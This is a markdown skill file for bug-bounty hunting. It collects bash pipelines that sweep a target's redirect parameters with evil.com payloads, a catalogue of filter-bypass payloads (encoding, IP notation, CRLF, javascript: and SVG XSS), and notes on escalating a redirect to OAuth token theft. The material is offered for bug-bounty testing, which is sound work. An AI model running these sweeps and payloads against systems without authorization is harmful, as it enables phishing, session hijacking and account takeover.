---
name: open-redirect-testing
description: Open redirect testing — sweeping every redirect/return/continue-shaped parameter across a target with an external payload and checking whether the server issues a redirect to attacker-controlled infrastructure. Covers parameter identification via a large case-insensitive keyword list, gf redirect pattern filtering, and bulk qsreplace+httpx confirmation pipelines chained onto full subdomain/URL discovery. Use this during Phase 3 (Vulnerability Testing — Client-side/Business logic) of bughunting-workflow on any parameter that looks like it controls a post-action destination (login, logout, checkout success, SSO callback). Also trigger on mentions of open redirect, redirect_uri, return_url, or unvalidated redirect.
---

# Open Redirect Testing

Command-reference library for open redirect discovery at scale. Add new entries as new payload-encoding bypass tricks (double-encoding, protocol-relative URLs, backslash tricks) get validated from future writeups.

## Core theory

Open redirect happens when a parameter controls where the app sends the browser next (post-login, post-logout, post-checkout, SSO callback) and the value isn't validated against an allowlist of same-origin/known destinations. On its own it's usually low-to-medium severity (phishing pretext: a link that starts on the real trusted domain but ends up on attacker infrastructure), but it becomes high-severity when chained — most commonly as the `redirect_uri` in an OAuth flow, where an open redirect on the *client* app lets an attacker steal the OAuth authorization code/token by redirecting the callback through their own server. Always check whether any discovered open redirect sits inside or near an OAuth/SSO flow before writing it up as a standalone low.

## Recorded technique: mass open-redirect discovery pipeline
Source: [Recon to Master: The Complete Bug Bounty Checklist](https://infosecwriteups.com/recon-to-master-the-complete-bug-bounty-checklist-95b80ea55ff0)

### Parameter identification — large keyword sweep
```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=" | tee redirect_params.txt
```
This keyword list is deliberately exhaustive and case-varied — different frameworks/apps name their redirect parameter completely differently, and a narrow grep misses most of them.

### GF pattern alternative
```bash
cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
```

### Basic confirmation sweep
```bash
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```
`-fr` (follow redirects) + `-mr "evil.com"` (match on the final response containing your payload domain) confirms the redirect actually landed on attacker-controlled infrastructure, not just that a 3xx was returned.

### Full pipeline: subdomain discovery → URL collection → redirect-param filter → confirmation
```bash
subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro \
  | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

### Payload-list loop (test multiple bypass payloads per parameter, not just one)
```bash
cat redirect_params.txt | while read url; do
  cat payloads/or.txt | while read payload; do
    echo "$url" | qsreplace "$payload"
  done
done | httpx-toolkit -silent -fr -mr "google.com"
```
Run a payload wordlist (protocol-relative `//evil.com`, whitespace/tab tricks `/\evil.com`, double-slash `https:/evil.com`, backslash variants, `@`-based userinfo tricks `https://real-site.com@evil.com`) through every discovered redirect parameter, matching against a neutral third-party domain (`google.com`) in the payload set so a single sweep can validate many bypass variants at once rather than one payload at a time.

## Recorded technique: exhaustive bypass payload catalog + escalation chaining
Source: [From Zero to Hero: Hunting High-Paying Open Redirect Bugs in Web Apps](https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e)

Fills in the generic "protocol-relative/backslash/@-trick" payload loop above with the specific variant list to actually run:

**Protocol/scheme tricks:**
- Double-slash: `//evil.com`
- Backslash substitution: `\\evil.com`
- Colon-only (missing slashes): `https:example.com`

**Encoding obfuscation:**
- At-symbol percent-encoded: `example.com%40evil.com`
- Dot percent-encoded: `example.com%2eevil.com`
- Hash/fragment: `evil.com%23example.com`
- Unicode/"Chinese dot" full-width period as a separator: `evil.com%E3%80%82%23example.com`
- Null byte / CR: `/%0d/evil.com`

**URL structure manipulation:**
- Query-string injection: `evil.com?example.com`
- Path traversal into an absolute URL: `/../../https://evil.com`
- Case variation (bypasses case-sensitive allowlist regex): `//GoOgLe.com/`
- Trailing slash/fragment noise: `//google.com/#/`

**IP-based bypasses** (defeat allowlists checking for a literal known hostname string, not the resolved destination):
- Decimal IP notation: `http://3232235777` (resolves to `192.168.1.1`)
- Hex IP notation: `http://0xC0A80001`
- IPv6 loopback/bracket notation: `http://[::1]/`
- Non-standard port appended to a trusted-looking host: `google.com:81`

**Scheme-abuse payloads (when the redirect sink also reflects into HTML/JS, not just a `Location` header):**
- SVG-based: `<svg onload="window.location='https://evil.com/'"/>`
- Data URI: `data:text/html;base64,<...>`
- `javascript:` scheme: `javascript:alert('XSS');//`

**CRLF-based filter/whitelist bypass for the JS-scheme variant specifically** (useful when a WAF/filter blocks the literal string `javascript:`):
```
java%0d%0ascript%0d%0a:alert(0)          # CRLF split inside the scheme keyword
javascript://%250Aalert(1)               # double-encoded newline
jaVAscript://whitelisted.com//%0d%0aalert(1);//   # case-mixed scheme + trusted-looking authority + CRLF payload
```
This variant matters specifically for **open redirect escalating to XSS/account-takeover**: if the redirect sink is reachable via a `javascript:`-scheme value and the app doesn't strip it, the "redirect" becomes script execution in the victim's session instead of just a navigation.

**Automation additions beyond the existing pipeline:**
```bash
# ffuf — parameter x payload matrix in one fuzz run, matched on the actual Location header value
ffuf -w redirect_params.txt:PARAM -w payloads/or.txt:PAYLOAD \
  -u "https://site.com/redirect.php?PARAM=PAYLOAD" \
  -mc 301,302,303,307,308 -mr "Location: http://google.com"

# curl — per-URL effective-vs-redirect-target diff, useful for manual triage of a shortlist
cat urls.txt | qsreplace "https://evil.com" \
  | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}

# nuclei — dedicated open-redirect template pass
echo subdomains.txt | nuclei -t openRedirect.yaml -c 30
```

**Escalation reference:** treat any open redirect found inside an OAuth flow as a candidate for full authorization-code/token theft, not just a phishing pretext — PortSwigger's "Lab: Stealing OAuth access tokens via an open redirect" is the canonical walkthrough of this exact chain (attacker-controlled `redirect_uri` captures the code/token when the victim completes the OAuth flow). If the target's own `redirect_uri` validation looks too strict for a bare open redirect to work directly, don't stop there — check `oauth-redirect-uri-bypass-testing` for the loose-prefix/substring/regex matching flaws and path-traversal-into-internal-open-redirect technique that gets you the same code/token theft even when full domain substitution is rejected.

**Reported bounty ranges** (useful for calibrating a report's ask, not a guarantee): plain open redirect — small sites $50–$200, mid-size companies $200–$500, larger corporations $500–$1000; **open redirect chained to account takeover** (via OAuth token theft or similar) — $1000–$5000.

## Impact framing for report

State plainly whether the redirect target validation is missing entirely (any external domain works) or only partially bypassed (blocks bare `evil.com` but not `//evil.com` or `@`-trick variants) — the latter is worth noting as an incomplete-fix pattern if the program has a prior report for the "basic" version of this bug. Escalate severity explicitly when the redirect parameter sits inside an OAuth `redirect_uri`/SSO callback rather than a plain post-login destination — see the escalation reference and bounty ranges above for how much that distinction is worth in practice.

**Client-side path-traversal source:** open redirect doesn't only come from a `redirect`/`return_url`-shaped query parameter — a client-side router/plugin-loader that resolves a *path segment* against attacker input without normalization can walk out to an external host the same way (mixed forward-slash/backslash encoding, double-encoding). See `path-traversal-testing`'s Grafana CVE-2025-4123 entry for the exact PoC shape and how the same bug also chained to XSS and SSRF on that target — worth checking any client-side routing/navigation logic for this pattern, not just query-string redirect params.

<!-- Add new recorded techniques below this line as new open-redirect writeups are processed. -->
